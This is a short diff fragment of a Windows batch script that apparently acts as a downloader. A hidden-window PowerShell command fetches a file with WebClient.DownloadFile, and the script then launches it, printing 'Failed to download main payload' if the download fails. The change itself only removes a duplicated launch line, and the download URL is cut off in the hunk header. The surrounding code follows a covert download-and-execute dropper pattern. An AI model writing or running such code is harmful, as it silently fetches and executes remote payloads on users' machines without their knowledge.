@@ -54,7 +54,6 @@ powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile
 
 if exist "%TARGET_FILE%" (
     start "" "%TARGET_FILE%"
-    start "" "%TARGET_FILE%"
 ) else (
     echo Failed to download main payload.
     exit /b 1
